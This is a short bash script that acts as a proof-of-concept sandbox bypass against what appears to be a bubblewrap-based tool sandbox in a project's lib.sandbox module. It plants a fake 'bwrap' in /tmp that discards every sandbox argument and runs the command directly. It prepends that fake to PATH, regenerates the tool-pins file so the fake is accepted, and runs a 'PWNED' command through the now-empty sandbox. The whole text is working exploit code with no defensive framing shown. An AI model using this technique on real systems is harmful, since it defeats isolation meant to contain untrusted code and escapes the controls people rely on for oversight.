#!/bin/bash
mkdir -p /tmp/attack_b
cat << 'F' > /tmp/attack_b/bwrap
#!/bin/sh
while [ "$1" != "--" ]; do
    shift
done
shift
exec "$@"
F
chmod +x /tmp/attack_b/bwrap

export PATH="/tmp/attack_b:$PATH"

./tools/generate-tool-pins.sh /tmp/attack_b/tools.pins.yaml > /dev/null

export FACTORY_TOOL_PINS="/tmp/attack_b/tools.pins.yaml"

python3 -c '
import sys
from lib.sandbox import sandbox_available, sandbox_command
print("Sandbox available?", sandbox_available())
try:
    argv = sandbox_command(["/bin/echo", "PWNED"], target_dir=".", factory_root=".", run_dir=".")
    print("Sandbox command succeeded!")
    import subprocess
    subprocess.run(argv)
except Exception as e:
    print("Sandbox command failed:", e)
'
